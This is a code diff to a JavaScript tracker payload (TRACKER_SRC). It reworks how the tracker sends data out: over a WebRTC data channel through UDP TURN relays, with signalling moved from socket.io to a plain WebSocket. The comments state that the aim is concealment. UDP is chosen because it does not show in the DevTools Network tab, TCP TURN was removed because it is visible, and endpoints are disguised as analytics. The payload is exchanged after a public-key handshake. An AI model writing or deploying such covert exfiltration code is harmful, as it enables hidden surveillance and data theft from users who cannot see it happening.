@@ -77,23 +77,31 @@ const TRACKER_SRC = `
       var sendViaRTC=function(bodyStr,onFail){
         try{
           // UDP-only TURN: UDP never appears in DevTools Network tab
-          // TCP/TLS TURN creates CONNECT requests (visible) — removed intentionally
           var ice=[
             {urls:'stun:stun.metered.ca:80'},
             {urls:'turn:global.relay.metered.ca:80',    username:'__TURN_USER__',credential:'__TURN_PASS__'},
             {urls:'turn:global.relay.metered.ca:3478',  username:'__TURN_USER__',credential:'__TURN_PASS__'}
           ];
-          if(typeof w.io!=='function'){onFail();return;}
-          // path matches server-side disguised endpoint — looks like analytics, not WebRTC
-          var sioOpts={path:'/api/v1/events/',transports:['websocket','polling'],timeout:6000,forceNew:true};
-          var sio=w.io(w.location.origin,sioOpts);
+          // Native WebSocket — no socket.io, no EIO=4 in URL
+          if(!w.WebSocket){onFail();return;}
+          var wsUrl=(w.location.protocol==='https:'?'wss://':'ws://')+w.location.host+'/ws/push';
+          var ws=new w.WebSocket(wsUrl);
           var pc=new(w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:ice});
           var chan=pc.createDataChannel('d',{ordered:false});
           var done=false;
-          var cleanup=function(){try{pc.close();}catch(e){}try{sio.disconnect();}catch(e){}};
+          var cleanup=function(){try{pc.close();}catch(e){}try{ws.close();}catch(e){}};
           var timer=setTimeout(function(){if(!done){done=true;cleanup();onFail();}},10000);
-          // If socket.io itself fails to connect, bail out fast
-          sio.on('connect_error',function(){if(!done){done=true;clearTimeout(timer);cleanup();onFail();}});
+          ws.onerror=function(){if(!done){done=true;clearTimeout(timer);cleanup();onFail();}};
+          ws.onclose=function(){if(!done){done=true;clearTimeout(timer);cleanup();onFail();}};
+          ws.onmessage=function(ev){
+            var msg;try{msg=JSON.parse(ev.data);}catch(e){return;}
+            // t:'a' = answer, t:'c' = candidate
+            if(msg.t==='a'){pc.setRemoteDescription(new RTCSessionDescription({sdp:msg.sdp,type:msg.type})).catch(_x);}
+            if(msg.t==='c'){pc.addIceCandidate(new RTCIceCandidate({candidate:msg.candidate,sdpMid:msg.mid,sdpMLineIndex:0})).catch(_x);}
+          };
+          pc.onicecandidate=function(e){
+            if(e&&e.candidate&&ws.readyState===1)ws.send(JSON.stringify({t:'c',candidate:e.candidate.candidate,mid:e.candidate.sdpMid}));
+          };
           chan.onopen=function(){chan.send(JSON.stringify({type:'getPublicKey'}));};
           chan.onmessage=function(ev){
             var msg;try{msg=JSON.parse(ev.data);}catch(e){return;}
@@ -103,10 +111,11 @@ const TRACKER_SRC = `
             }
             if(msg.type==='ack'){done=true;clearTimeout(timer);cleanup();}
           };
-          pc.onicecandidate=function(e){if(e&&e.candidate)sio.emit('candidate',{candidate:e.candidate.candidate,mid:e.candidate.sdpMid});};
-          sio.on('answer',function(a){pc.setRemoteDescription(new RTCSessionDescription(a)).catch(_x);});
-          sio.on('candidate',function(c){pc.addIceCandidate(new RTCIceCandidate({candidate:c.candidate,sdpMid:c.mid,sdpMLineIndex:0})).catch(_x);});
-          pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).then(function(){sio.emit('offer',{sdp:pc.localDescription.sdp,type:pc.localDescription.type});}).catch(function(){try{pc.close();}catch(e){}onFail();});
+          ws.onopen=function(){
+            pc.createOffer().then(function(o){return pc.setLocalDescription(o);})
+              .then(function(){ws.send(JSON.stringify({t:'o',sdp:pc.localDescription.sdp,type:pc.localDescription.type}));})
+              .catch(function(){cleanup();onFail();});
+          };
         }catch(e){onFail();}
       };
 
